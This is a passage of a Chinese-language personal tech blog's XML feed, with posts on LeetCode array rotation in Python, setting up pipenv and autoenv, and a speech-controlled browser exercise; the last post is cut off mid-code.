target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/option-files.html</a></li><li><a href="https://time.geekbang.org/column/article/68633" target="_blank" rel="noopener">https://time.geekbang.org/column/article/68633</a></li><li><a href="https://stackoverflow.com/questions/50691977/how-to-reset-the-root-password-in-mysql-8-0-11" target="_blank" rel="noopener">https://stackoverflow.com/questions/50691977/how-to-reset-the-root-password-in-mysql-8-0-11</a></li><li><a href="https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;MySQL与MariaDB&quot;&gt;&lt;a href=&quot;#MySQL与MariaDB&quot; class=&quot;headerlink&quot; title=&quot;MySQL与MariaDB&quot;&gt;&lt;/a&gt;MySQL与MariaDB&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/zh-hans/MariaDB&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;MariaDB&lt;/a&gt; 是 MySQL 的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。所以现在主流的 Linux 发行版基本都默认使用 MariaDB 作为默认的 MySQL 实现。ArchLinux 已经将Oracle的MySQL移至&lt;a href=&quot;https://aur.archlinux.org/packages/mysql/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;AUR&lt;/a&gt; 中。&lt;/p&gt;
    
    </summary>
    
    
      <category term="MySQL" scheme="https://xiaotaoist.github.io/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode 136：旋转数组[初级]</title>
    <link href="https://xiaotaoist.github.io/2018/08/07/leetcode-136/"/>
    <id>https://xiaotaoist.github.io/2018/08/07/leetcode-136/</id>
    <published>2018-08-07T08:28:20.000Z</published>
    <updated>2018-08-09T04:15:16.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a href="https://leetcode-cn.com/problems/rotate-array/description/" target="_blank" rel="noopener">189：旋转数组</a><br>        给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。</p><a id="more"></a><p>示例1:</p><blockquote><pre><code>输入: [1,2,3,4,5,6,7] 和 k = 3输出: [5,6,7,1,2,3,4]解释:向右旋转 1 步: [7,1,2,3,4,5,6]向右旋转 2 步: [6,7,1,2,3,4,5]向右旋转 3 步: [5,6,7,1,2,3,4]</code></pre></blockquote><p>示例2:</p><blockquote><pre><code> 输入: [-1,-100,3,99] 和 k = 2 输出: [3,99,-1,-100] 解释: 向右旋转 1 步: [99,-1,-100,3] 向右旋转 2 步: [3,99,-1,-100]</code></pre></blockquote><p>说明:</p><pre><code>* 尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。* 要求使用空间复杂度为 O(1) 的原地算法。</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>方法一:空间复杂度O(n)<br>首先想到的就是切片，以[-1,-100,3,99]，k=2 为例： 先用[-2:]拿到 [3,99]，再用[:-2]得到剩下的[-1,-100]</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type nums: List[int]</span></span><br><span class="line"><span class="string">    :type k: int</span></span><br><span class="line"><span class="string">    :rtype: void Do not return anything, modify nums in-place instead.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    nums = nums[-k:] + nums[:-k]</span><br></pre></td></tr></table></figure><p>提交以后才发现结果不对，这才想起nums此时其实是一个新建的局部变量，不影响原来的List，修改如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">    new_nums = nums[-k:] + nums[:-k]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">        nums[i] = new_nums[i]</span><br></pre></td></tr></table></figure></p><p>还是没有考虑全，还有nums=[1,2,3],k=5这种k&gt;len(nums)的情况，我们进行取模运算，最终代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">    length = len(nums)</span><br><span class="line">    i = k%length</span><br><span class="line">    new_nums = nums[-i:] + nums[:-i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">        nums[i] = new_nums[i]</span><br></pre></td></tr></table></figure></p><p>看了别的提交的代码后发现可以用Python浅拷贝的魔法糖list[:],它等价于<code>list.copy()</code>：只复制对象地址，而非完整对象资源。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">    </span><br><span class="line">    i = len(nums) - k </span><br><span class="line">    nums[:] = nums[i:] + nums[:i]</span><br></pre></td></tr></table></figure></p><ul><li><p>方法2:空间复杂度O(1)<br>按题目要求，我们可以用这个思路：删除最后一个元素，把最后一个元素的内容插入到List的开头位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self,nums,k)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> k:</span><br><span class="line">        tail = nums.pop()</span><br><span class="line">        nums.insert(<span class="number">0</span>,tail)</span><br><span class="line">        k -=<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>日常使用的话,标准集合库<code>collections</code>里deque(双向列表)提供了旋转数组的方法:rotate</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line">d = deque([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>])</span><br><span class="line">d.rotate(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://leetcode-cn.com/problems/rotate-array/description/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;189：旋转数组&lt;/a&gt;&lt;br&gt;        给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。&lt;/p&gt;
    
    </summary>
    
    
      <category term="leetcode,python" scheme="https://xiaotaoist.github.io/tags/leetcode-python/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode 189：旋转数组[初级]</title>
    <link href="https://xiaotaoist.github.io/2018/08/07/leetcode-189/"/>
    <id>https://xiaotaoist.github.io/2018/08/07/leetcode-189/</id>
    <published>2018-08-07T08:28:20.000Z</published>
    <updated>2018-08-07T12:48:19.960Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a href="https://leetcode-cn.com/problems/rotate-array/description/" target="_blank" rel="noopener">189：旋转数组</a><br>        给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。</p><a id="more"></a><p>示例1:</p><blockquote><pre><code>输入: [1,2,3,4,5,6,7] 和 k = 3输出: [5,6,7,1,2,3,4]解释:向右旋转 1 步: [7,1,2,3,4,5,6]向右旋转 2 步: [6,7,1,2,3,4,5]向右旋转 3 步: [5,6,7,1,2,3,4]</code></pre></blockquote><p>示例2:</p><blockquote><pre><code> 输入: [-1,-100,3,99] 和 k = 2 输出: [3,99,-1,-100] 解释: 向右旋转 1 步: [99,-1,-100,3] 向右旋转 2 步: [3,99,-1,-100]</code></pre></blockquote><p>说明:</p><pre><code>* 尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。* 要求使用空间复杂度为 O(1) 的原地算法。</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>方法一:空间复杂度O(n)<br>首先想到的就是切片，以[-1,-100,3,99]，k=2 为例： 先用[-2:]拿到 [3,99]，再用[:-2]得到剩下的[-1,-100]</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type nums: List[int]</span></span><br><span class="line"><span class="string">    :type k: int</span></span><br><span class="line"><span class="string">    :rtype: void Do not return anything, modify nums in-place instead.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    nums = nums[-k:] + nums[:-k]</span><br></pre></td></tr></table></figure><p>提交以后才发现结果不对，这才想起nums此时其实是一个新建的局部变量，不影响原来的List，修改如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">    new_nums = nums[-k:] + nums[:-k]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">        nums[i] = new_nums[i]</span><br></pre></td></tr></table></figure></p><p>还是没有考虑全，还有nums=[1,2,3],k=5这种k&gt;len(nums)的情况，我们进行取模运算，最终代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">    length = len(nums)</span><br><span class="line">    i = k%length</span><br><span class="line">    new_nums = nums[-i:] + nums[:-i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">        nums[i] = new_nums[i]</span><br></pre></td></tr></table></figure></p><p>看了别的提交的代码后发现可以用Python浅拷贝的魔法糖list[:],它等价于<code>list.copy()</code>：只复制对象地址，而非完整对象资源。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">    </span><br><span class="line">    i = len(nums) - k </span><br><span class="line">    nums[:] = nums[i:] + nums[:i]</span><br></pre></td></tr></table></figure></p><ul><li><p>方法2:空间复杂度O(1)<br>按题目要求，我们可以用这个思路：删除最后一个元素，把最后一个元素的内容插入到List的开头位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(self,nums,k)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> k:</span><br><span class="line">        tail = nums.pop()</span><br><span class="line">        nums.insert(<span class="number">0</span>,tail)</span><br><span class="line">        k -=<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>日常使用的话,标准集合库<code>collections</code>里deque(双向列表)提供了旋转数组的方法:rotate</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line">d = deque([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>])</span><br><span class="line">d.rotate(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://leetcode-cn.com/problems/rotate-array/description/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;189：旋转数组&lt;/a&gt;&lt;br&gt;        给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。&lt;/p&gt;
    
    </summary>
    
    
      <category term="leetcode,python" scheme="https://xiaotaoist.github.io/tags/leetcode-python/"/>
    
  </entry>
  
  <entry>
    <title>终极 Python Project 管理方案：pipenv + autoenv</title>
    <link href="https://xiaotaoist.github.io/2018/07/26/pipenv/"/>
    <id>https://xiaotaoist.github.io/2018/07/26/pipenv/</id>
    <published>2018-07-26T13:54:18.000Z</published>
    <updated>2018-07-28T09:08:56.935Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>使用过<code>pip</code>的同学都知道它的强大与方便，但学习的时候免不了安装各种各样的库，最后需要导出依赖的时候才发现无从下手，<code>virtualenv</code>便是为了解决此问题而诞生的，但若有很多项目，构建虚拟环境并手动切换，也是个繁琐的工作，好在有了更强大的解决方案：<a href="https://github.com/pypa/pipenv" target="_blank" rel="noopener">pipenv</a>(项目依赖管理器)+<a href="https://github.com/kennethreitz/autoenv" target="_blank" rel="noopener">autoenv</a>(自动激活环境)。</p><a id="more"></a><h2 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h2><ul><li>Arch Linux + zsh + python3 + pip3</li></ul><h2 id="pipenv"><a href="#pipenv" class="headerlink" title="pipenv"></a>pipenv</h2><p>pipenv 是Kenneth Reitz编写的一个用于创建和管理Python虚拟环境的新工具</p><ul><li>安装<blockquote><p>pip install pipenv –user #推荐安装到个人目录</p></blockquote></li><li><p>手动添加python的bin目录到<code>$PATH</code>变量中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python -m site --user-base                  <span class="comment">#查看pip 安装路径</span></span><br><span class="line">&gt; /home/taoist/.<span class="built_in">local</span>                       <span class="comment">#这是我的路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑 ~/.zshrc 在最后一行添加</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/home/taoist/.<span class="built_in">local</span>/bin   <span class="comment">#注意到bin</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc ＃重新载入终端配置文件</span><br></pre></td></tr></table></figure></li><li><p>使用</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir test_project                  <span class="comment">#新建一个空目录</span></span><br><span class="line"><span class="built_in">cd</span> test_project </span><br><span class="line">pipenv install                      <span class="comment">#创建一个新的虚拟环境</span></span><br></pre></td></tr></table></figure></li><li><p>安装</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pipenv install requests             <span class="comment">#手动安装requests库</span></span><br><span class="line">pipenv install -r requirements.txt  <span class="comment">#根据requirements.txt 自动安装库依赖</span></span><br></pre></td></tr></table></figure></li><li><p>运行虚拟环境</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pipenv run python xxx.py            <span class="comment">#用虚拟环境运行 xxx.py </span></span><br><span class="line">pipenv shell                        <span class="comment">#激活shell虚拟环境</span></span><br><span class="line"><span class="built_in">exit</span>                                <span class="comment">#退出当前虚拟环境</span></span><br></pre></td></tr></table></figure></li><li><p>删除</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pipenv uninstall requests           <span class="comment">#删除requests库</span></span><br><span class="line">pipenv --rm                         <span class="comment">#移除此项目</span></span><br></pre></td></tr></table></figure></li><li><p>其他</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pipenv graph                        <span class="comment">#查看包依赖</span></span><br><span class="line">pipenv check                        <span class="comment">#检查编码风格 与安全隐患</span></span><br><span class="line">pipenv lock -r                      <span class="comment">#生成requirements.txt 文件</span></span><br></pre></td></tr></table></figure></li></ul><p>更多使用请参考<a href="https://docs.pipenv.org/" target="_blank" rel="noopener">官方文档</a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li><p>使用国内pypi镜像加速下载</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编辑配置文件，更改url 使用豆瓣镜像</span></span><br><span class="line">vim Pipfile </span><br><span class="line"></span><br><span class="line">[[<span class="built_in">source</span>]]</span><br><span class="line">url = <span class="string">"https://pypi.douban.com/simple"</span></span><br></pre></td></tr></table></figure></li><li><p>将venv环境文件放到当前目录，默认在用户目录</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"export PIPENV_VENV_IN_PROJECT=1"</span> &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure></li><li><p>开启zsh 对 pipenv 的自动补全功能</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>  <span class="string">'eval "$(pipenv --completion)"'</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></li><li><p>自动激活虚拟环境,需要写入<code>.env</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"pipenv shell"</span> &gt; .env  <span class="comment">#将环境配置写入到 .env 文件中</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="autoenv"><a href="#autoenv" class="headerlink" title="autoenv"></a>autoenv</h2><p>当您 cd 进入一个包含 .env 的目录中，就会 autoenv 自动激活那个环境。</p><ul><li><p>安装</p><blockquote><p>pip install autoenv</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#激活</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source `which activate.sh`"</span> &gt;&gt; ~/.zshrc <span class="comment">#zsh shell 激活autoenv </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.zhsrc                                 <span class="comment">#重新载入配置</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>使用<br>配置完成，以后<code>cd</code>到项目目录后，就会自动激活虚拟环境了，如果是第一次进入，会提示你是否允许自动激活，输入 y ，回车确认即可。<br><img src="/img/pipenv_autoenv.png" alt="autoenv"><br>z</p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://pythonguidecn.readthedocs.io/zh/latest/dev/virtualenvs.html" target="_blank" rel="noopener">https://pythonguidecn.readthedocs.io/zh/latest/dev/virtualenvs.html</a></li><li><a href="http://www.dongwm.com/archives/%E4%BD%BF%E7%94%A8pipenv%E7%AE%A1%E7%90%86%E4%BD%A0%E7%9A%84%E9%A1%B9%E7%9B%AE/" target="_blank" rel="noopener">http://www.dongwm.com/archives/%E4%BD%BF%E7%94%A8pipenv%E7%AE%A1%E7%90%86%E4%BD%A0%E7%9A%84%E9%A1%B9%E7%9B%AE/</a></li><li><a href="https://www.jianshu.com/p/8c6ae288ba48" target="_blank" rel="noopener">https://www.jianshu.com/p/8c6ae288ba48</a></li><li><a href="https://zhuanlan.zhihu.com/p/31056585" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/31056585</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;使用过&lt;code&gt;pip&lt;/code&gt;的同学都知道它的强大与方便，但学习的时候免不了安装各种各样的库，最后需要导出依赖的时候才发现无从下手，&lt;code&gt;virtualenv&lt;/code&gt;便是为了解决此问题而诞生的，但若有很多项目，构建虚拟环境并手动切换，也是个繁琐的工作，好在有了更强大的解决方案：&lt;a href=&quot;https://github.com/pypa/pipenv&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pipenv&lt;/a&gt;(项目依赖管理器)+&lt;a href=&quot;https://github.com/kennethreitz/autoenv&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;autoenv&lt;/a&gt;(自动激活环境)。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="https://xiaotaoist.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0025</title>
    <link href="https://xiaotaoist.github.io/2018/06/16/python-exercise-0025/"/>
    <id>https://xiaotaoist.github.io/2018/06/16/python-exercise-0025/</id>
    <published>2018-06-16T12:03:43.000Z</published>
    <updated>2018-06-17T12:23:00.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>使用 Python 实现：对着电脑吼一声,自动打开浏览器中的默认网站。</code></pre><a id="more"></a><blockquote><p>例如，对着笔记本电脑吼一声“百度”，浏览器自动打开百度首页。<br>关键字：Speech to Text</p></blockquote><p>参考思路：</p><ol><li>获取电脑录音–&gt;WAV文件 python record wav</li><li>录音文件–&gt;文本<ul><li>STT: Speech to Text</li><li>STT API Google API</li></ul></li><li>文本–&gt;电脑命令</li></ol><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>根据参考思路，用<a href="https://people.csail.mit.edu/hubert/pyaudio/docs/" target="_blank" rel="noopener">pyaudio</a>去录音，传给腾讯AI开放平台的<a href="https://ai.qq.com/doc/aaiasr.shtml" target="_blank" rel="noopener">语音识别接口</a>，需要自行<a href="https://ai.qq.com/cgi-bin/login?from=https%3A%2F%2Fai.qq.com%2Fcgi-bin%2Fconsole_overview" target="_blank" rel="noopener">注册</a>，根据返回的文本去执行相应的命令，这里用<a href="https://docs.python.org/3/library/webbrowser.html" target="_blank" rel="noopener">webbrowser</a>去操作浏览器。</p><blockquote><p>pip install  webbrowser pyaudio</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyaudio</span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apiutil</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"></span><br><span class="line">FILE_NAME = <span class="string">"tmp.wav"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#录音</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record_sound</span><span class="params">()</span>:</span></span><br><span class="line">    FORMAT = pyaudio.paInt16</span><br><span class="line">    CHANNELS = <span class="number">1</span></span><br><span class="line">    RATE = <span class="number">16000</span></span><br><span class="line">    CHUNK = <span class="number">1024</span></span><br><span class="line">    RECORD_SECONDS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#按照16KHz，单声道，16位最多采集声音3秒</span></span><br><span class="line">    audio = pyaudio.PyAudio()</span><br><span class="line">    stream = audio.open(</span><br><span class="line">        format=FORMAT,</span><br><span class="line">        channels=CHANNELS,</span><br><span class="line">        rate=RATE,</span><br><span class="line">        input=<span class="keyword">True</span>,</span><br><span class="line">        frames_per_buffer=CHUNK)</span><br><span class="line">    print(<span class="string">'开始录音'</span>)</span><br><span class="line">    <span class="comment">#过滤背景噪音</span></span><br><span class="line">    frames = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, int(RATE / CHUNK * RECORD_SECONDS)):</span><br><span class="line">        data = stream.read(CHUNK)</span><br><span class="line">        data_chunk = array(<span class="string">'h'</span>, data)</span><br><span class="line">        vol = max(data_chunk)</span><br><span class="line">        <span class="comment">#只录入大于2000 的声音。</span></span><br><span class="line">        <span class="keyword">if</span> (vol &gt;= <span class="number">2000</span>):</span><br><span class="line">            frames.append(data)</span><br><span class="line">    print(<span class="string">'录音结束'</span>)</span><br><span class="line">    <span class="comment">#结束录音</span></span><br><span class="line">    stream.stop_stream()</span><br><span class="line">    stream.close()</span><br><span class="line">    audio.terminate()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#将结果写入到wav文件</span></span><br><span class="line">    wavfile = wave.open(FILE_NAME, <span class="string">'wb'</span>)</span><br><span class="line">    wavfile.setnchannels(CHANNELS)</span><br><span class="line">    wavfile.setsampwidth(audio.get_sample_size(FORMAT))</span><br><span class="line">    wavfile.setframerate(RATE)</span><br><span class="line">    wavfile.writeframes(<span class="string">b''</span>.join(frames))  <span class="comment">#append frames recorded to 